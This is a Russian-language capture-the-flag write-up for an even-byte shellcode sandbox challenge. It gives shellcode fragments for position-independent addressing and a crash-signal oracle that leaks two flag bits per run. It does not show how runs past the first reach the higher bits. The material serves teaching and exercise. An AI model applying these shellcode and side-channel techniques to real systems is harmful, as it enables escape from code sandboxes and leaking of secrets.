# Решение Shelvecode Sandbox

## Интерфейс

В архиве находится PIE-бинарник shelvecode-sandbox. Сервис принимает одно выполнение shellcode на TCP-соединение.

Протокол:

~~~text
Shelvecode shellcode monitor
length> <десятичная длина>
hex> <байты в шестнадцатеричном виде>
<ответ>
~~~

Длина не больше 64 байт. Каждый байт должен иметь чётное значение. Например, 0x02 допустим, а 0x03 будет отклонён.

После ответа соединение закрывается. Для нового запуска нужно подключиться ещё раз.

Возможные ответы:

- SIGSEGV;
- SIGFPE;
- SIGILL;
- SIGALRM;
- EXIT.

SIGALRM выдаётся родительским процессом, если дочерний процесс не завершился за 150 миллисекунд.

## Что делает программа

Флаг читается из /run/case/flag в глобальную структуру:

~~~c
struct sandbox_memory {
    unsigned char code[0x1005];
    char flag[64];
};
~~~

Структура выровнена по странице памяти. Поэтому:

- начало shellcode находится по адресу arena.code;
- начало флага находится по адресу arena.code + 0x1005.

Страница с буфером shellcode делается исполняемой. Сам бинарник собран как PIE, поэтому абсолютный адрес arena.code заранее неизвестен.

Перед переходом в shellcode монитор обнуляет все общие регистры. Стек остаётся обычным, но для решения он не нужен.

## Какие инструкции остаются

Условие разрешает только байты, у которых младший бит равен нулю. Из-за этого обычный shellcode почти полностью исчезает:

- нет syscall;
- нет обычного ret;
- нет большинства 64-битных mov, add, sub и lea;
- нельзя напрямую открыть файл или вывести данные.

Но остаются полезные инструкции:

~~~text
e8              call rel32
5e              pop rsi
8a 86 disp32    mov al, [rsi + disp32]
b2 imm8         mov dl, imm8
fe c2           inc dl
84 d0           test al, dl
f6 c0 imm8      test al, imm8
74 rel8         je rel8
e2 fe           loop -2
f4              hlt
f6 f0           div al
~~~

Все байты в этих последовательностях чётные.

## Получение адреса флага

Последовательность:

~~~asm
e8 00 00 00 00    callq 0
5e                pop rsi
~~~

callq 0 кладёт на стек адрес следующей инструкции, а pop rsi получает этот адрес. Теперь в rsi находится адрес внутри шеллкода, независимо от случайной базы PIE.

После pop rsi используется:

~~~text
8a 86 xx xx xx xx
~~~

Это загружает один байт из памяти по адресу rsi + disp32.

Для байта флага с индексом i:

~~~text
disp32 = 0x1000 + i - prefix_length
~~~

Для нечётных индексов перед call добавляется один байт NOP (90). Это меняет адрес, полученный через pop, и оставляет все байты смещения чётными.

## Оракул на два бита

После загрузки байта флага программа проверяет два младших бита.

Полный фрагмент:

~~~asm
b2 00          mov  dl, 0
fe c2          inc dl
84 d0          test al, dl
74 0c          je  bit0_zero

f6 c0 02       test al, 2
74 02          je  value_01
e2 fe          loop -2

value_01:
b0 00          mov  al, 0
f6 f0          div  al

bit0_zero:
90
90
f6 c0 02       test al, 2
74 04          je  value_00
62 00 00 00    invalid instruction

value_00:
f4             hlt
~~~

Значения сопоставляются с результатом запуска:

| Биты | Ответ |
|---|---|
| 00 | SIGSEGV |
| 01 | SIGFPE |
| 10 | SIGILL |
| 11 | SIGALRM |

Почему:

- hlt в пользовательском режиме даёт SIGSEGV;
- деление на ноль даёт SIGFPE;
- последовательность 62 00 00 00 декодируется как недопустимая инструкция и даёт SIGILL;
- loop -2 зацикливается, после чего родитель убивает процесс сигналом SIGALRM.

Таким образом, один запуск раскрывает сразу два бита флага.

## Восстановление флага

Для каждого индекса байта:

1. Собрать шеллкод с нужным смещением.
2. Выполнить его четыре раза.
3. Получить четыре пары битов.
4. Собрать один байт.
5. Остановиться после }.

Например, если ответы для четырёх запусков соответствуют:

~~~text
SIGFPE, SIGSEGV, SIGALRM, SIGSEGV
~~~

то пары битов равны:

~~~text
01 00 11 00
~~~

Итоговый байт:

~~~text
0b00110001 = 0x31 = '1'
~~~

Готовый solve.py выполняет этот цикл автоматически:

~~~sh
python3 solve.py <ip> <port>
~~~
